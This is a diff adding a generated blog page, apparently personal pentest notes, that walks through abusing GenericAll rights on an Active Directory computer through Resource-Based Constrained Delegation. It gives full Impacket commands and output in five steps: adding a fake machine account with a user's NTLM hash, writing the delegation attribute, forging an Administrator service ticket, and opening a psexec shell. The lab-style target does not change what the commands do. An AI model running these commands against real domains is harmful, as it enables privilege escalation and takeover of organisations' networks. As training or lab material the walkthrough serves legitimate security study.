@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html id="R-html" lang="en-us" dir="ltr" itemscope itemtype="http://schema.org/Article" data-r-output-format="html">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    <meta name="generator" content="Hugo 0.154.5">
+    <meta name="generator" content="Relearn 9.0.3+5fff5bc8a066e83e5f67f0de49c7dfb57379219e">
+    <meta name="description" content="GenericAll permission on a domain computer The user l.livingstone has GenericAll permission on the domain computer RESOURCEDC$.
+GenericAll grants full control over the object — including the ability to write to msDS-AllowedToActOnBehalfOfOtherIdentity. This makes Resource-Based Constrained Delegation (RBCD) abuse possible: we create a machine account we control, configure the target to trust it for delegation, then impersonate any user (including Administrator) to obtain a service ticket via S4U2Proxy.">
+    <meta name="author" content="">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="GenericAll permission on a domain computer :: Zenu">
+    <meta name="twitter:description" content="GenericAll permission on a domain computer The user l.livingstone has GenericAll permission on the domain computer RESOURCEDC$.
+GenericAll grants full control over the object — including the ability to write to msDS-AllowedToActOnBehalfOfOtherIdentity. This makes Resource-Based Constrained Delegation (RBCD) abuse possible: we create a machine account we control, configure the target to trust it for delegation, then impersonate any user (including Administrator) to obtain a service ticket via S4U2Proxy.">
+    <meta property="og:url" content="http://localhost:1313/posts/ad/rbcd/index.html">
+    <meta property="og:site_name" content="Zenu">
+    <meta property="og:title" content="GenericAll permission on a domain computer :: Zenu">
+    <meta property="og:description" content="GenericAll permission on a domain computer The user l.livingstone has GenericAll permission on the domain computer RESOURCEDC$.
+GenericAll grants full control over the object — including the ability to write to msDS-AllowedToActOnBehalfOfOtherIdentity. This makes Resource-Based Constrained Delegation (RBCD) abuse possible: we create a machine account we control, configure the target to trust it for delegation, then impersonate any user (including Administrator) to obtain a service ticket via S4U2Proxy.">
+    <meta property="og:locale" content="en_us">
+    <meta property="og:type" content="article">
+    <meta property="article:section" content="Posts">
+    <meta property="article:published_time" content="2026-04-16T22:12:34+09:00">
+    <meta property="article:modified_time" content="2026-04-16T22:12:34+09:00">
+    <meta property="article:tag" content="RBCD">
+    <meta property="article:tag" content="GenericAll">
+    <meta itemprop="name" content="GenericAll permission on a domain computer :: Zenu">
+    <meta itemprop="description" content="GenericAll permission on a domain computer The user l.livingstone has GenericAll permission on the domain computer RESOURCEDC$.
+GenericAll grants full control over the object — including the ability to write to msDS-AllowedToActOnBehalfOfOtherIdentity. This makes Resource-Based Constrained Delegation (RBCD) abuse possible: we create a machine account we control, configure the target to trust it for delegation, then impersonate any user (including Administrator) to obtain a service ticket via S4U2Proxy.">
+    <meta itemprop="datePublished" content="2026-04-16T22:12:34+09:00">
+    <meta itemprop="dateModified" content="2026-04-16T22:12:34+09:00">
+    <meta itemprop="wordCount" content="302">
+    <meta itemprop="keywords" content="RBCD,GenericAll">
+    <title>GenericAll permission on a domain computer :: Zenu</title>
+    <link href="/images/favicon.png?1776345942" rel="icon" type="image/png">
+    <link href="/css/auto-complete/auto-complete.min.css?1776345942" rel="stylesheet">
+    <script src="/js/auto-complete/auto-complete.min.js?1776345942" defer></script>
+    <script src="/js/search-lunr.js?1776345942" defer></script>
+    <script src="/js/search.js?1776345942" defer></script>
+    <script>
+      window.relearn = window.relearn || {};
+      window.relearn.index_js_url="/searchindex.en.js?1776345942";
+    </script>
+    <script src="/js/lunr/lunr.min.js?1776345942" defer></script>
+    <script src="/js/lunr/lunr.stemmer.support.min.js?1776345942" defer></script>
+    <script src="/js/lunr/lunr.multi.min.js?1776345942" defer></script>
+    <script src="/js/lunr/lunr.en.min.js?1776345942" defer></script>
+    <script>
+      window.relearn = window.relearn || {};
+      window.relearn.contentLangs=['en'];
+    </script>
+    <link href="/fonts/fontawesome/css/all.min.css?1776345942" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/all.min.css?1776345942" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1776345942" rel="stylesheet">
+    <link href="/css/theme.css?1776345942" rel="stylesheet">
+    <link href="/css/format-html.css?1776345942" rel="stylesheet" id="R-format-style">
+    <script>
+      window.relearn = window.relearn || {};
+      // configuration
+      window.relearn.min = ``;
+      window.relearn.path='\/posts\/ad\/rbcd\/index.html';
+      window.relearn.relBasePath='..\/..\/..';
+      window.relearn.relBaseUri='..\/..\/..';
+      window.relearn.absBaseUri='http:\/\/localhost:1313';
+      window.relearn.disableInlineCopyToClipboard=false;
+      window.relearn.enableBlockCodeWrap=true;
+      // translations
+      window.T_Copy_to_clipboard = `Copy text to clipboard`;
+      window.T_Copied_to_clipboard = `Text copied to clipboard!`;
+      window.T_Link_copied_to_clipboard = `Link copied to clipboard!`;
+      window.T_Reset_view = `Reset view`;
+      window.T_View_reset = `View reset!`;
+      window.T_No_results_found = `No results found for "{0}"`;
+      window.T_N_results_found = `{1} results found for "{0}"`;
+      window.T_Browser_unsupported_feature = `This browser doesn't support this feature`;
+      // variant stuff
+      window.relearn.themevariants = [ 'auto' ];
+      window.relearn.customvariantprefix = "my-custom-";
+      window.relearn.changeVariant = function(variant) {
+        var oldVariant = document.documentElement.dataset.rThemeVariant;
+        window.localStorage.setItem(window.relearn.absBaseUri + "/variant", variant);
+        document.documentElement.dataset.rThemeVariant = variant;
+        if (oldVariant != variant) {
+          document.dispatchEvent( new CustomEvent('themeVariantLoaded', { detail: { variant, oldVariant } }) );
+          window.relearn.markVariant();
+        }
+      }
+      window.relearn.markVariant = function() {
+        var variant = window.localStorage.getItem(window.relearn.absBaseUri + "/variant");
+        document.querySelectorAll(".R-variantswitcher select").forEach((select) => {select.value = variant;});
+      }
+      window.relearn.initVariant = function() {
+        var variant = window.localStorage.getItem(window.relearn.absBaseUri + "/variant") ?? "";
+        if( !variant ||
+            (!variant.startsWith(window.relearn.customvariantprefix) && !window.relearn.themevariants.includes(variant)) ||
+            (variant.startsWith(window.relearn.customvariantprefix) && !window.localStorage.getItem(window.relearn.absBaseUri + "/variantstylesheet-" + variant)) ){
+          variant = window.relearn.themevariants[0];
+          window.localStorage.setItem(window.relearn.absBaseUri + "/variant", variant);
+        }
+        document.documentElement.dataset.rThemeVariant = variant;
+      }
+      window.relearn.initVariant();
+      window.relearn.markVariant();
+    </script>
+  </head>
+  <body class="mobile-support html" data-origin="/posts/ad/rbcd/index.html">
+    <div id="R-body" class="default-animation">
+      <div id="R-body-overlay"></div>
+      <nav id="R-topbar" class="default-animation">
+        <div class="topbar-wrapper default-animation">
+          <div class="topbar-sidebar-divider default-animation"></div>
+          <div class="topbar-area topbar-area-start" data-area="start">
+            <div class="topbar-button topbar-button-sidebar default-animation" data-content-empty="disable" data-width-s="show" data-width-m="hide" data-width-l="hide">
+<span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleNav()" type="button" title="Menu (CTRL&#43;ALT&#43;n)"><i class="fa-fw fas fa-bars"></i></button></span>
+            </div>
+            <div class="topbar-button topbar-button-toc default-animation" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleTopbarFlyout(this)" type="button" title="Table of Contents (CTRL&#43;ALT&#43;t)"><i class="fa-fw fas fa-table-list"></i></button></span>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper">
+<nav class="TableOfContents">
+  <ul>
+    <li><a href="#step-1--add-a-fake-computer-to-the-domain">Step 1 — Add a fake computer to the domain</a></li>
+    <li><a href="#step-2--configure-rbcd-on-the-target-computer">Step 2 — Configure RBCD on the target computer</a></li>
+    <li><a href="#step-3--request-a-service-ticket-as-administrator">Step 3 — Request a service ticket as Administrator</a></li>
+    <li><a href="#step-4--export-the-ticket">Step 4 — Export the ticket</a></li>
+    <li><a href="#step-5--connect-via-psexec">Step 5 — Connect via psexec</a></li>
+  </ul>
+</nav>
+                </div>
+              </div>
+            </div>
+          </div>
+          <ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype="http://schema.org/BreadcrumbList"><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/index.html"><span itemprop="name">Zenu</span></a><meta itemprop="position" content="1">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/posts/index.html"><span itemprop="name">Posts</span></a><meta itemprop="position" content="2">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/posts/ad/index.html"><span itemprop="name">Active Directory</span></a><meta itemprop="position" content="3">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><span itemprop="name">GenericAll permission on a domain computer</span><meta itemprop="position" content="4"></li>
+          </ol>
+          <div class="topbar-area topbar-area-end" data-area="end">
+            <div class="topbar-button topbar-button-prev default-animation" data-content-empty="disable" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><a href="/posts/ad/index.html" title="Active Directory (🡐)"><i class="fa-fw fas fa-chevron-left"></i></a></span>
+            </div>
+            <div class="topbar-button topbar-button-next default-animation" data-content-empty="disable" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><a href="/posts/webdav/index.html" title="WebDAV Exploitation with davtest (🡒)"><i class="fa-fw fas fa-chevron-right"></i></a></span>
+            </div>
+            <div class="topbar-button topbar-button-more default-animation" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleTopbarFlyout(this)" type="button" title="More"><i class="fa-fw fas fa-ellipsis-v"></i></button></span>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper">
+                  <div class="topbar-area topbar-area-more" data-area="more">
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav>
+      <div id="R-main-overlay"></div>
+      <main id="R-body-inner" class="highlightable posts" tabindex="-1">
+        <div class="flex-block-wrapper">
+<article class="default">
+  <header class="headline">
+<div class="R-taxonomy taxonomy-tags cstyle tags" title="Tags" style="--VARIABLE-TAGS-BG-color: var(--INTERNAL-TAG-BG-color);">
+  <i class="fa-fw fas fa-layer-group"></i>
+  <ul>
+    <li><a class="term-link" href="/tags/genericall/index.html">GenericAll</a></li>
+    <li><a class="term-link" href="/tags/rbcd/index.html">RBCD</a></li>
+  </ul>
+</div>
+  </header>
+
+<h1 id="genericall-permission-on-a-domain-computer">GenericAll permission on a domain computer</h1>
+
+<h1 id="genericall-permission-on-a-domain-computer">GenericAll permission on a domain computer<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
+<p><a href="#R-image-6dbd3c4e9ab6b1c6d56e5cdb393e3d6e" class="lightbox-link"><img alt="bloodhound" class="lazy lightbox figure-image" loading="lazy" src="/images/rbcd/genericall.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-6dbd3c4e9ab6b1c6d56e5cdb393e3d6e"><img alt="bloodhound" class="lazy lightbox lightbox-image" loading="lazy" src="/images/rbcd/genericall.png"></a></p>
+<p>The user <strong>l.livingstone</strong> has <strong>GenericAll</strong> permission on the domain computer <strong>RESOURCEDC$</strong>.</p>
+<p>GenericAll grants full control over the object — including the ability to write to <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>. This makes <strong>Resource-Based Constrained Delegation (RBCD)</strong> abuse possible: we create a machine account we control, configure the target to trust it for delegation, then impersonate any user (including Administrator) to obtain a service ticket via S4U2Proxy.</p>
+<h2 id="step-1--add-a-fake-computer-to-the-domain">Step 1 — Add a fake computer to the domain<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p><code>impacket-addcomputer</code> creates a new machine account in the domain. We authenticate as l.livingstone using her NTLM hash.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-addcomputer resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name <span style="color:#e6db74">&#39;fake$&#39;</span> -computer-pass <span style="color:#e6db74">&#39;password!&#39;</span> -dc-ip 192.168.176.175
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully added machine account fake$ with password password!</span></span></code></pre></div>
+<h2 id="step-2--configure-rbcd-on-the-target-computer">Step 2 — Configure RBCD on the target computer<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p>Using our GenericAll rights, write <code>fake$</code> into the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute of <code>RESOURCEDC$</code>. This tells the target to trust <code>fake$</code> for delegation.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-rbcd resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -delegate-from <span style="color:#e6db74">&#39;fake$&#39;</span> -delegate-to <span style="color:#e6db74">&#39;RESOURCEDC$&#39;</span> -action write -dc-ip 192.168.176.175
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Delegation rights modified successfully!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> fake$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Accounts allowed to act on behalf of other identity:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     fake$        <span style="color:#f92672">(</span>S-1-5-21-537427935-490066102-1511301751-4101<span style="color:#f92672">)</span></span></span></code></pre></div>
+<h2 id="step-3--request-a-service-ticket-as-administrator">Step 3 — Request a service ticket as Administrator<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p>Using <code>impacket-getST</code>, perform S4U2Self + S4U2Proxy as <code>fake$</code> to obtain a CIFS ticket impersonating Administrator.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-getST resourced.local/fake$:<span style="color:#e6db74">&#39;password!&#39;</span> -spn cifs/resourcedc.resourced.local -impersonate Administrator -dc-ip 192.168.176.175
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> CCache file is not found. Skipping...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Getting TGT <span style="color:#66d9ef">for</span> user
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Impersonating Administrator
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting S4U2self
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting S4U2Proxy
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving ticket in Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache</span></span></code></pre></div>
+<h2 id="step-4--export-the-ticket">Step 4 — Export the ticket<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p>Set the <code>KRB5CCNAME</code> environment variable so Impacket tools pick up the saved ticket automatically.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache</span></span></code></pre></div>
+<h2 id="step-5--connect-via-psexec">Step 5 — Connect via psexec<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p>Since we authenticate with Kerberos, the target&rsquo;s hostname must resolve correctly. Add an entry to <code>/etc/hosts</code> if needed, then connect using the ticket.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-psexec -k -no-pass resourcedc.resourced.local</span></span></code></pre></div>
+
+  <footer class="footline">
+              <i class='fa-fw fas fa-calendar'></i> Apr 16, 2026
+  </footer>
+</article>
+        </div>
+      </main>
+    </div>
+    <aside id="R-sidebar" class="default-animation">
+      <div id="R-header-topbar" class="default-animation"></div>
+      <div id="R-header-wrapper" class="default-animation">
+        <a id="R-logo" class="R-default direction-row" href="/index.html">
+          <span class="logo-title default-animation">Zenu</span>
+        </a>
+        <search><form action="/search/index.html" method="get">
+          <div class="searchbox default-animation">
+            <button class="search-detail" type="submit" title="Search (CTRL+ALT+f)"><i class="fas fa-fw fa-search"></i></button>
+            <label class="a11y-only" for="R-search-by">Search</label>
+            <input data-search-input id="R-search-by" name="search-by" class="search-by" type="search" placeholder="Search...">
+            <button class="search-clear" type="button" data-search-clear="" title="Clear search"><i class="fas fa-fw fa-times" title="Clear search"></i></button>
+          </div>
+        </form></search>
+      </div>
+      <div id="R-homelinks" class="default-animation homelinks">
+        <div class="R-menu-divider default-animation">
+          <hr class="padding default-animation">
+        </div>
+        <div class="R-sidebarmenu R-shortcutmenu-homelinks default-animation">
+          <ul class="space collapsible-menu">
+            <li class="" data-nav-id="/index.html"><a class="padding" href="/index.html"><i class="fa-fw fas fa-home"></i> Home</a></li>
+          </ul>
+        </div>
+        <div class="R-menu-divider default-animation">
+          <hr class="padding default-animation">
+        </div>
+        <div class="R-sidebarmenu R-shortcutmenu-headercontrols default-animation">
+          <ul class="">
+          </ul>
+        </div>
+        <div class="R-menu-divider default-animation">
+          <hr class="padding default-animation">
+        </div>
+      </div>
+      <div id="R-content-wrapper" class="highlightable">
+        <div class="R-sidebarmenu R-shortcutmenu-main default-animation">
+          <ul class="enlarge morespace collapsible-menu">
+            <li class="parent " data-nav-id="/posts/index.html"><a class="padding default-animation" href="/posts/index.html">Posts</a><ul id="R-subsections-b4e55eb7e39db1aee6d02808a2267090" class="collapsible-menu">
+            <li class="parent alwaysopen " data-nav-id="/posts/ad/index.html"><a class="padding default-animation" href="/posts/ad/index.html">Active Directory</a><ul id="R-subsections-f4784161091e67b921ce9162ec1e6966" class="collapsible-menu">
+            <li class="active " data-nav-id="/posts/ad/rbcd/index.html"><a class="padding" href="/posts/ad/rbcd/index.html">GenericAll permission on a domain computer</a></li></ul></li>
+            <li class="" data-nav-id="/posts/webdav/index.html"><a class="padding" href="/posts/webdav/index.html">WebDAV Exploitation with davtest</a></li>
+            <li class="" data-nav-id="/posts/pivoting/index.html"><a class="padding" href="/posts/pivoting/index.html">Pivoting</a></li>
+            <li class="" data-nav-id="/posts/file-transfer/index.html"><a class="padding" href="/posts/file-transfer/index.html">File Transfer</a></li>
+            <li class="" data-nav-id="/posts/revshell-upgrade/index.html"><a class="padding" href="/posts/revshell-upgrade/index.html">Stabilize a reverse shell</a></li></ul></li>
+            <li class="" data-nav-id="/private/index.html"><a class="padding default-animation" href="/private/index.html">Private</a><ul id="R-subsections-770b76f7b7b90b1c020ff5111c7b62af" class="collapsible-menu"></ul></li>
+            <li class="" data-nav-id="/writeup/index.html"><a class="padding default-animation" href="/writeup/index.html">Writeup</a><ul id="R-subsections-4c552b9ca9f2e0503cd4c0d79a1b1839" class="collapsible-menu"></ul></li>
+          </ul>
+        </div>
+        <div class="R-sidebarmenu R-shortcutmenu-shortcuts default-animation">
+          <div class="nav-title padding">More</div>
+          <ul class="space collapsible-menu">
+            <li class="" data-nav-id="https://github.com/eoniboogie/CVE_Disclosures"><a class="padding" href="https://github.com/eoniboogie/CVE_Disclosures" rel="external"><i class="fab fa-github"></i> CVE Disclosures</a></li>
+          </ul>
+        </div>
+        <div id="R-footer-margin" class="default-animation"></div>
+        <div class="R-menu-divider default-animation">
+          <hr class="padding default-animation">
+        </div>
+        <div class="R-sidebarmenu R-shortcutmenu-footercontrols default-animation">
+          <ul class="">
+          </ul>
+        </div>
+<div id="R-footer" class="default-animation"><p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p></div>
+      </div>
+    </aside>
+    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1776345942" defer></script>
+    <script src="/js/theme.js?1776345942" defer></script>
+    <div id="toast-container" role="status" aria-live="polite" aria-atomic="false"></div>
+  </body>
+</html>
